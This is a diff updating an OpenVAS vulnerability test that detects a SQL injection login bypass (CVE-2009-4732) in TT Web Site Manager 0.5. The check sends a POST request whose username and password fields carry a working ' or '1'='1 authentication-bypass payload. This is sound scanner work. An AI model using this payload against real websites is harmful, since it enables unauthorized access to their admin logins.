@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_ttwm_sql_inj_vuln.nasl 8469 2018-01-19 07:58:21Z teissa $
+# $Id: secpod_ttwm_sql_inj_vuln.nasl 13222 2019-01-22 13:35:43Z cfischer $
 #
 # TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability
 #
@@ -24,94 +24,88 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation could allow execution of arbitrary SQL
-commands in the affected application.
-
-Impact Level: Application";
-
-tag_affected = "TT Web Site Manager version 0.5 and prior.";
-
-tag_insight = "The flaw is due to input validation error in the 'tt/index.php'
-script when processing the 'tt_name' parameter.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "The host is running TT web site manager and is prone to SQL injection
-vulnerability.";
+CPE = "cpe:/a:technotoad:tt_web_site_manager";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902135");
-  script_version("$Revision: 8469 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-01-19 08:58:21 +0100 (Fri, 19 Jan 2018) $");
+  script_version("$Revision: 13222 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-22 14:35:43 +0100 (Tue, 22 Jan 2019) $");
   script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
   script_cve_id("CVE-2009-4732");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
   script_name("TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/36129");
-  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9336");
-  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2128");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/36129");
+  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9336");
+  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/2128");
 
   script_tag(name:"qod_type", value:"remote_banner");
   script_copyright("Copyright (c) 2010 SecPod");
-  script_category(ACT_MIXED_ATTACK);
+  script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_dependencies("secpod_tt_website_manager_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_mandatory_keys("technotoad/tt_web_site_manager/detected");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow execution of arbitrary SQL
+  commands in the affected application.");
+
+  script_tag(name:"affected", value:"TT Web Site Manager version 0.5 and prior.");
+
+  script_tag(name:"insight", value:"The flaw is due to input validation error in the 'tt/index.php'
+  script when processing the 'tt_name' parameter.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"The host is running TT web site manager and is prone to SQL injection
+  vulnerability.");
+
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("version_func.inc");
+include("host_details.inc");
 
-ttwmport = get_http_port(default:80);
-if(!ttwmport){
+if(!port = get_app_port(cpe:CPE))
   exit(0);
-}
 
-ttwmver = get_kb_item("www/" + ttwmport + "/TTWebsiteManager");
-if(isnull(ttwmver)){
+host = http_host_name(port:port);
+
+if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:FALSE))
   exit(0);
-}
 
-ttwmver = eregmatch(pattern:"^(.+) under (/.*)$", string:ttwmver);
-if(!isnull(ttwmver[2]))
-{
+vers = infos["version"];
+path = infos["location"];
 
-  host = http_host_name(port:ttwmport);
+if(path) {
 
-  filename = string(ttwmver[2] + "/index.php");
-  authVariables = "tt_name=admin+%27+or%27+1%3D1&tt_userpassword=admin+%27" +
-                  "+or%27+1%3D1&action=Log+me+in";
+  if(path == "/")
+    path = "";
+
+  filename = string(path + "/index.php");
+  authVariables = "tt_name=admin+%27+or%27+1%3D1&tt_userpassword=admin+%27+or%27+1%3D1&action=Log+me+in";
   sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
-  rcvRes = http_send_recv(port:ttwmport, data:sndReq);
-  if("location: ttsite.php" >< rcvRes)
-  {
-    security_message(ttwmport);
+  rcvRes = http_send_recv(port:port, data:sndReq);
+  if("location: ttsite.php" >< rcvRes) {
+    security_message(port:port);
     exit(0);
   }
 }
 
-if(!isnull(ttwmver[1]))
-{
-  # TT Website Manager version <= 0.5
-   if(version_is_less_equal(version:ttwmver[1], test_version:"0.5")){
-    security_message(ttwmport);
-  }
+if(vers && version_is_less_equal(version:vers, test_version:"0.5")) {
+  report = report_fixed_ver(installed_version:vers, fixed_version:"WillNotFix");
+  security_message(port:port, data:report);
 }
+
+exit(99);
